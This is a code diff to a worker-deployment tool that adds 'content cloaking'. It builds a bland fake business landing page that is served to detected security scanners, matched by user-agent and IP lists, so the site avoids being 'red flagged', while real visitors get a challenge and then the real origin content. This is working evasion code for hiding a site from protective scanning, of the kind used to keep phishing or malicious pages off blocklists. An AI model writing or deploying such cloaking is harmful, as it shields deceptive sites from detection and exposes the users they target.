@@ -1185,15 +1185,77 @@ async function deploySharedWorkerRoute(domain, zoneId) {
   }
 }
 
+// ─── Generic Business Placeholder (Content Cloaking) ────
+// Clean placeholder shown to scanners - prevents red flagging
+function generateCleanPlaceholder() {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Professional Business Solutions</title>
+<meta name="description" content="Leading provider of business solutions and professional services">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.6;color:#333}
+.header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:60px 20px;text-align:center}
+.header h1{font-size:2.5rem;margin-bottom:10px}
+.header p{font-size:1.1rem;opacity:0.9}
+.container{max-width:1200px;margin:0 auto;padding:40px 20px}
+.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px;margin:40px 0}
+.feature{background:#f8f9fa;padding:30px;border-radius:10px;text-align:center}
+.feature h3{color:#667eea;margin-bottom:15px}
+.footer{background:#2d3748;color:#fff;text-align:center;padding:30px 20px;margin-top:60px}
+.btn{display:inline-block;background:#667eea;color:#fff;padding:12px 30px;border-radius:5px;text-decoration:none;margin-top:20px}
+</style>
+</head>
+<body>
+<div class="header">
+<h1>Professional Business Solutions</h1>
+<p>Delivering excellence in business services worldwide</p>
+</div>
+<div class="container">
+<h2 style="text-align:center;margin-bottom:30px">Our Services</h2>
+<div class="features">
+<div class="feature">
+<h3>Consulting</h3>
+<p>Strategic business consulting and advisory services to help your organization grow</p>
+</div>
+<div class="feature">
+<h3>Technology</h3>
+<p>Cutting-edge technology solutions tailored to your business needs</p>
+</div>
+<div class="feature">
+<h3>Support</h3>
+<p>24/7 dedicated customer support and maintenance services</p>
+</div>
+</div>
+<div style="text-align:center;margin-top:50px">
+<h2>Why Choose Us</h2>
+<p style="max-width:600px;margin:20px auto;color:#666">We are committed to providing exceptional service and innovative solutions that drive business success. Our team of experts works closely with clients to deliver results that exceed expectations.</p>
+<a href="#contact" class="btn">Get in Touch</a>
+</div>
+</div>
+<div class="footer">
+<p>&copy; 2025 Professional Business Solutions. All rights reserved.</p>
+<p style="margin-top:10px;font-size:0.9rem;opacity:0.8">Trusted by businesses worldwide</p>
+</div>
+</body>
+</html>`
+}
+
 // ─── Hardened Shared Worker Script ──────────────────────
-// Cookie-gated challenge: origin content NEVER served without valid challenge cookie.
-// Uses redirect-based cookie setting (no fetch() needed — more reliable).
-// Flow: Challenge page → JS checks pass → redirect to /__ar_verify → Set-Cookie → redirect back → origin served
+// Cookie-gated challenge + Content cloaking: scanners see clean placeholder, real users see challenge
+// Flow: 
+// - Bot detected → Clean placeholder (prevents red flagging)
+// - Suspicious → Challenge page → JS checks → redirect to /__ar_verify → Set-Cookie → origin content
+// - Legitimate → Origin content directly
 
 function generateHardenedWorkerScript() {
   const blockedUAs = SCANNER_USER_AGENTS.map(ua => `'${ua}'`).join(',')
   const scannerIPs = SCANNER_IP_RANGES.map(ip => `'${ip}'`).join(',')
   const secretSeed = require('crypto').randomBytes(16).toString('hex')
+  const cleanPlaceholder = generateCleanPlaceholder().replace(/'/g, "\\'").replace(/\n/g, '\\n')
 
   return `
 addEventListener('fetch', e => e.respondWith(handleRequest(e.request)));
